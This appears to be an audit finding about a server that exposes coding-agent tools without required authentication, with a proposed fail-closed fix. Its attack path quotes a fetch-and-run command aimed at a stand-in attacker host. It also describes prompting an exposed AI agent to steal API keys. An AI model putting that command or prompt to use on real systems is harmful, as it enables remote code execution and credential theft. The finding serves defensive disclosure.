## S1 — Fail-open authentication on an RCE endpoint shipped with HOST=0.0.0.0 and no fail-closed startup guard
- **severity:** high
- **file:** `src/httpServer.ts:74-80` (with `Dockerfile:40` `ENV HOST=0.0.0.0`)
- **problem:** The POST /mcp endpoint registers tools (codex/cursor/claude/opencode/run_all) that spawn autonomous coding-agent CLIs which execute arbitrary code, write files at a caller-controlled `cwd`, and hold the container's OPENAI_API_KEY / CURSOR_API_KEY / ANTHROPIC_API_KEY. Authentication is entirely optional: `const token = process.env.MCP_TOKEN; if (token && !isTokenValid(...))` — when MCP_TOKEN is unset the check is skipped and every request is accepted. The runtime image ships `ENV HOST=0.0.0.0` (Dockerfile:40) and there is NO startup guard tying non-loopback binds to a required token. The only thing that keeps the shipped setup safe is the loopback port mapping in docker-compose.yml; an operator running the image directly (`docker run -p 3919:3919 agent-mcp-hub`) — the natural command, without the `127.0.0.1:` prefix — publishes an unauthenticated RCE surface on all host interfaces. Concrete attack path: attacker on the network POSTs a JSON-RPC `tools/call` for `codex`/`claude` with a prompt instructing the agent to run `curl attacker/x | sh` (or sets `cwd` to a secrets dir and asks it to exfiltrate the API keys) → agent executes on the host with the server's cloud credentials. Two additional facets of the same weakness: (a) even on the intended loopback deployment with no token, ANY other local user/process on a shared host can drive the endpoint (confused-deputy against the credential-holding server); (b) `spawn` runs the agent with the caller-supplied `cwd` unrestricted to /workspace, so a caller can operate anywhere on the filesystem the process can reach.
- **fix:** Fail closed at startup. In `startHttpServer`, before `httpServer.listen(port, host)`, throw if the bind host is not in LOOPBACK_HOSTNAMES and `!process.env.MCP_TOKEN` (e.g. `if (!LOOPBACK_HOSTNAMES.has(host) && !process.env.MCP_TOKEN) throw new Error('Refusing to bind non-loopback host without MCP_TOKEN')`). Remove `ENV HOST=0.0.0.0` from the Dockerfile (keep the http.ts default of 127.0.0.1) and document that exposing the port requires BOTH MCP_TOKEN and a TLS reverse proxy. Optionally always require MCP_TOKEN. Separately, constrain the agent `cwd` to an allowlisted root (default the mounted /workspace) so a caller cannot point agents at arbitrary host paths.
